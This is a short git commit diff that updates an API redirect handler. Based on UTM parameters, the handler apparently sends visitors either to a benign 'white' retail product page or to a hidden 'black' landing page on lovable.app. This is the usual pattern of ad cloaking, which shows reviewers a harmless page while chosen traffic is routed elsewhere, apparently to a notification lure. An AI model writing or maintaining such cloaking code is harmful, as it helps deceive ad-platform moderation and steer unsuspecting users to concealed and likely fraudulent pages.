0cdca42cd90c84a764fc8e730b335475e9b0ad93
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-16 15:25:39 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.naturebaby.com.au/products/beechwood-rattle-natural";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://needs-store.com/collections/home-decor/products/candle-holders-with-crystal";
+    const blackPageURL = "https://ubuzznotifier.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
